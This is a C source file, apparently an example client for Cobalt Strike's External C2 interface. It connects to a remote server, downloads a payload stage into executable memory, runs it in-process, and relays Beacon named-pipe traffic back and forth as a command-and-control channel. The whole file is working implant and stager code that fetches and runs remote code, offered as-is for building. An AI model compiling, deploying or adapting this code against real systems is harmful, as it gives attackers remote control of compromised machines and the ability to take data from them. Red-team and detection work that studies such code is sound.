/* a quick-client for Cobalt Strike's External C2 server */
/* build with:
	i686-w64-mingw32-gcc rsmudge_c2_example.c -o rsmudge_c2_example.exe -lws2_32 */
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

/* read a frame from a handle (pipe)*/
DWORD read_frame (HANDLE my_handle, char* buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	
	/* read the 4-byte length */
	ReadFile(my_handle, (char*)&size, 4, &temp, NULL);
	
	/* read the whole thing in */
	while(total < size) {
	ReadFile(my_handle, buffer + total, size -total, &temp, 
		NULL);
	total += temp;
	}

return size;
}


/* receive a frame from a socket */
DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;
	
	/* read the 4-byte length */
	recv(my_socket, (char*)&size, 4, 0);
	
	/* read in the result */
	while
	(total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		total += temp;
	}
	
	return size;
}

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char * buffer, int length) {
	send(my_socket, (char*)&length, 4, 0);
	send(my_socket, buffer, length, 0);
}

/* write a frame to a file (pipe) */
void write_frame(HANDLE my_handle, char* buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(my_handle, (void*)&length, 4, &wrote, NULL);
	WriteFile(my_handle, buffer, length, &wrote, NULL);
}

/* the main logic for our client */
void go(char* host, DWORD port) {
	/*
	* connect to the External C2 server
	*/
	
	/* copy our target information into the address structure */
	struct sockaddr_in sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(host);
	sock.sin_port = htons(port);

	/* attempt to connect */
	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);

	if ( connect(socket_extc2, (structsockaddr *)&sock, 
			sizeof(sock)) ) {
		printf("Could not connect to %s:%d\n", host, port);
		exit(0);
	}
	
	/* receive our stage */
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, 
		PAGE_EXECUTE_READWRITE);
	recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);
	
	/* inject the payload stage into the current process */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) 
		NULL, 0, NULL);
	
	/*
	* connect to our Beacon named pipe
	*/
	
	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
	while (handle_beacon == INVALID_HANDLE_VALUE) {
		Sleep(1000);
		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", 
			GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, 
			SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, 
			NULL);
	}
	
	/* setup our buffer */
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE); 
	
	/*
	* relay frames back and forth
	*/
	
	while (TRUE) {
		/* read from our named pipe Beacon */
		DWORD read = read_frame(handle_beacon, buffer, 
			BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}
	
		/* write to the External C2 server */
		send_frame(socket_extc2, buffer, read);
	
		/* read from the External C2 server */
		read = recv_frame(socket_extc2, buffer, BUFFER_MAX_SIZE);
		if (read < 0) {
			break;
		}
	
		/* write to our named pipe Beacon */
		write_frame(handle_beacon, buffer, read);
	}
	
		/* close our handles */
		CloseHandle(handle_beacon);
		closesocket(socket_extc2);
}

void main(DWORD argc, char* argv[]) {

	/* check our arguments */
	if(argc != 3) {
		printf("%s [host] [port]\n", argv[0]);
		exit(1);
	}

	/* initialize winsock */
	WSADATA wsaData;
	WORD    wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);

	/* start our client */
	go(argv[1], atoi(argv[2]));
}
